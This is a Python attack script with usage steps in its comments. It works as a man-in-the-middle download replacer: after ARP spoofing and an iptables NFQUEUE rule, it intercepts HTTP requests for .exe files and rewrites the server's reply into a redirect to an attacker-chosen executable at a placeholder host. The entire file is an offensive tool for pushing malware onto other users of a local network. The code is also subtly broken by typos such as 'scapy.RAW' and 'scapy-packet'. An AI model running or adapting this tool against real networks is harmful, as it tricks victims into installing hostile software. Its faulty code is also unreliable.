#!/usr/bin/env python

# Requirements
# sudo apt-get update
# sudo apt-get install libnetfilter-queue-dev
# pip install netfilterqueue


# steps to use this tool are :
# 1.first replace  the target exe link in the modified_packet :- http://www.host_website.com/software.exe
# 2.start your iptable forwarding using this cmd :- iptables -I FORWARD -j NFQUEUE --queue-num 0
# 3.use the any arp spoofer :-https://github.com/anishalx/arp_spoofer (or you can use any other also)
# 4.make sure to start the ip forwarding using the cmd :- echo 1 > /proc/sys/net/ipv4/ip_forward
# 5.if you stopped the attacking then at last you can flush your ip tables using this cmd :- iptables --flush


import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
     return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.RAW):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load.decode(errors='ignore'):
                print("[=] exe request")
                ack_list.append(scapy-packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport ==80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 MOVED Permanently\nLocation: http://www.host_website.com/software.exe\n\n")
                    packet.set_payload(str(modified_packet))
    

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

